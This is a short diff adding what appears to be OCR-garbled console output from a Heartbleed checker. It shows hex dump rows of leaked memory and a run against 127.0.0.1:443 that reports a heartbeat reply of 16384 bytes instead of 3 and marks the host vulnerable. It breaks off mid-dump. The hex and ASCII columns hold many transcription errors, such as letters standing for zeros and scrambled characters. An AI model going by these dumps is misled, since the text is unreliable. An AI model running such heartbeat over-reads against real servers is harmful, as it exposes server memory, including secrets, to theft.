@@ -1,0 +1,36 @@
+O 3A CO 3B CO 3C CO 3D CO 3E CO 3F CO
+8.9.1.4.<.=.>.?.
+01e0: 40 CO 41 CO 42 CO 43 C0 44 CO 45 CO 46 CO 47 CO
+@.A.B.C.D.E.F.G.
+01f0: 48 CO 49 CO 4A CO 4B CO 4C CO 4D CO 4E CO 4F CO
+H.I.J.K.L.M.N.O.
+0200: 50 CO 51 CO 52 C0 53 CO 54 C0 55 C0 56 CO 57 CO
+P.Q.R.S.T.U.V.W.
+0210: 58 CO 59 CO 5A CO 5B CO 5C CO 5D CO 5E CO 5F CO
+XY.Z.[.\.].4._.
+0220: 60 CO 61 CO 62 CO 63 CO 64 C0 65 CO 66 CO 67 CO
+‘a.b.c.d.e.fg.
+0230: 68 CO 69 CO 6A CO 6B CO 6C CO 6D CO 6E CO 6F CO
+h.ij-K..m.n.0.
+0240: 70 CO 71 CO 72 CO 73 CO 74 CO 75 CO 76 C0 77 CO
+p.¢.r.S.t.U.V.W.
+0250: 78 CO 79 CO 7A CO 7B CO 7C CO 7D CO 7E CO 7F CO
+XY.Z.4,].}.~..
+02c0: 00 00 49 00 OB 00 04 03 00 01 02 00 0A 00 34 00
+i eee 4.
+02d0: 32 00 OE 00 OD 00 19 00 0B 00 OC 00 18 00 09 00
+0300: 10 00 11 00 23 00 00 00 OF 00 01 01 00 00 00 00
+oe ae
+te)7
+Obd0: 00 00 00 00 00 00 00 00 00 12 7D 01 00 10 00 02
+ceseeseee posse
+[-] Closing connection
+[-] Connecting to 127.0.0.1:443 using TLSv1.1
+[-] Sending ClientHello
+[-] ServerHello received
+[-] Sending Heartbeat
+[Vulnerable] Heartbeat response was 16384 bytes instead of 3!
+127.0.0.1:443 is vulnerable over TLSv1.1
+[-] Displaying response (lines consisting entirely of null bytes are
+removed):
+0000: 02 F
